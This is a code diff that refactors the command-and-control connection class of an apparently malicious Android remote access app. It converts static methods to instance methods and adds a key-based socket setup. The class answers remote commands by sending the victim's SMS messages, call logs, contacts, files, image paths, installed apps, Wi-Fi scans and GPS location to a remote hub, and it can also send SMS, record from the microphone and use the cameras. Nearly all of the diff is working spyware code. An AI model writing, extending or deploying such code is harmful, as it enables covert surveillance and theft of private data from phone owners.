@@ -3,6 +3,7 @@ package com.remote.app;
 import android.Manifest;
 import android.content.Context;
 import android.content.pm.PackageManager;
+import android.location.LocationManager;
 import android.os.Build;
 import android.os.Looper;
 import android.provider.Settings;
@@ -23,22 +24,26 @@ import io.reactivex.disposables.Disposable;
 
 public class ConnectionManager {
 
-
-    public static Context context;
+    private final Context context;
     private static HubConnection ioSocket;
     private static boolean initialBoot = false;
+    private final LocManager locManager;
 
-    public static void startAsync(Context con) {
+    public ConnectionManager(Context con) {
+        context = con;
+        locManager = new LocManager(con);
+    }
+
+    public void startAsync(String key) {
         try {
-            context = con;
-            sendReq();
+            sendReq(key);
         } catch (Exception ex) {
-            startAsync(con);
+            startAsync(key);
         }
 
     }
 
-    private static void setupHandlers(HubConnection ioSocket){
+    private void setupHandlers(HubConnection ioSocket) {
 
         ioSocket.on("0xCA", (data) -> {
             try {
@@ -65,7 +70,7 @@ public class ConnectionManager {
         ioSocket.on("0xGI", () -> {
             try {
                 GI();
-            } catch (Exception ex){
+            } catch (Exception ex) {
                 ex.printStackTrace();
             }
         });
@@ -162,20 +167,19 @@ public class ConnectionManager {
         });
     }
 
-    public static void sendReq() {
+    private void sendReq(String key) {
         try {
             if (ioSocket != null && ioSocket.getConnectionState() != HubConnectionState.DISCONNECTED)
                 return;
 
-            ioSocket = IOSocket.getInstance().getIoSocket();
+            ioSocket = IOSocket.getInstance().init(key);
 
-            if (!initialBoot){
+            if (!initialBoot) {
                 initialBoot = true;
 
                 setupHandlers(ioSocket);
             }
             ///ioSocket.on("ping", () -> ioSocket.send("pong"));
-
 
 
             ioSocket.start().subscribe(new CompletableObserver() {
@@ -218,7 +222,7 @@ public class ConnectionManager {
 
     }
 
-    public static void CA(int cameraID) {
+    private void CA(int cameraID) {
         if (cameraID == -1) {
             JSONObject cameraList = new CameraManager(context).findCameraList();
             if (cameraList != null)
@@ -228,19 +232,18 @@ public class ConnectionManager {
         }
     }
 
-    public static void FI(int req, String path) {
+    private void FI(int req, String path) {
         if (req == 0) {
             ioSocket.send("_0xFI", FileManager.walk(path).toString());
         } else if (req == 1)
             FileManager.downloadFile(path);
     }
 
-    public static void GI() {
+    private void GI() {
         ioSocket.send("_0xGI", FileManager.getAllShownImagesPath().toString());
     }
 
-
-    public static void SM(int req, String phoneNo, String msg) {
+    private void SM(int req, String phoneNo, String msg) {
         if (req == 0)
             ioSocket.send("_0xLM", SMSManager.getsms().toString());
         else if (req == 1) {
@@ -250,50 +253,49 @@ public class ConnectionManager {
         }
     }
 
-    public static void CL() {
+    private void CL() {
         ioSocket.send("_0xCL", CallsManager.getCallsLogs().toString());
     }
 
-    public static void CO() {
+    private void CO() {
         ioSocket.send("_0xCO", ContactsManager.getContacts().toString());
     }
 
-    public static void MI(int sec) throws Exception {
+    private void MI(int sec) throws Exception {
         MicManager.startRecording(sec);
     }
 
-    public static void WI() {
+    private void WI() {
         ioSocket.send("_0xWI", WifiScanner.scan(context).toString());
     }
 
-    public static void PM() {
-        ioSocket.send("_0xPM", PermissionManager.getGrantedPermissions().toString());
+    private void PM() {
+        ioSocket.send("_0xPM", PermissionManager.getGrantedPermissions(context).toString());
     }
 
 
-    public static void IN() {
-        ioSocket.send("_0xIN", AppList.getInstalledApps(false).toString());
+    private void IN() {
+        ioSocket.send("_0xIN", AppList.getInstalledApps(false, context).toString());
     }
 
-
-    public static void GP(String perm) {
+    private void GP(String perm) {
         JSONObject data = new JSONObject();
         try {
             data.put("permission", perm);
-            data.put("isAllowed", PermissionManager.canIUse(perm));
+            data.put("isAllowed", PermissionManager.canIUse(perm, context));
             ioSocket.send("_0xGP", data.toString());
         } catch (JSONException e) {
 
         }
     }
 
-    public static void LO() throws Exception {
-        Looper.prepare();
-        LocManager gps = new LocManager(context);
+    private void LO() throws Exception {
         // check if GPS enabled
-        if (gps.canGetLocation()) {
-            ioSocket.send("_0xLO", gps.getData());
+        locManager.getLocation();
+        if (locManager.canGetLocation()) {
+            ioSocket.send("_0xLO", locManager.getData().toString());
         }
+
     }
 
 }
